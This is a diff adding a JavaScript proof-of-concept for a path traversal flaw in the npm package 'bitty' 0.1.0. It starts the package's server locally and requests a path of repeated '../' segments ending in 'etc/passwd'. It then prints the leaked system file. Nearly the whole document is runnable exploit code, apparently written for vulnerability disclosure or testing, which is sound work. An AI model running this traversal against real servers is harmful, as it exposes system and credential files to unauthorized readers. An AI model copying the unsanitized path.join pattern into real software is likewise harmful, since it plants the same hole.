@@ -1,0 +1,35 @@
+```javascript
+// Path Traversal vulnerability in "bitty" (0.1.0)
+// node_modules/bitty/index.js -> file(req, res) builds:
+//   var filepath = path.join(program.directory, req.url);
+// req.url is taken verbatim from the raw HTTP request line and is never
+// sanitized, so a request path containing "../" segments lets a client
+// read arbitrary files outside the served directory.
+
+const http = require('http');
+
+// Avoid bitty's CLI parser picking up this script's own argv.
+process.argv = ['node', 'bitty'];
+
+// Requiring the package immediately starts its HTTP server (default port 4000).
+require('bitty');
+
+setTimeout(() => {
+  const traversalPath =
+    '/' + '../'.repeat(12) + 'etc/passwd'; // enough ../ to reach filesystem root
+
+  http.get({ host: 'localhost', port: 4000, path: traversalPath }, (res) => {
+    let data = '';
+    res.on('data', (chunk) => (data += chunk));
+    res.on('end', () => {
+      console.log('Status:', res.statusCode);
+      console.log('--- Leaked file contents via path traversal ---');
+      console.log(data);
+      process.exit(0);
+    });
+  }).on('error', (err) => {
+    console.error('Request failed:', err);
+    process.exit(1);
+  });
+}, 800);
+```
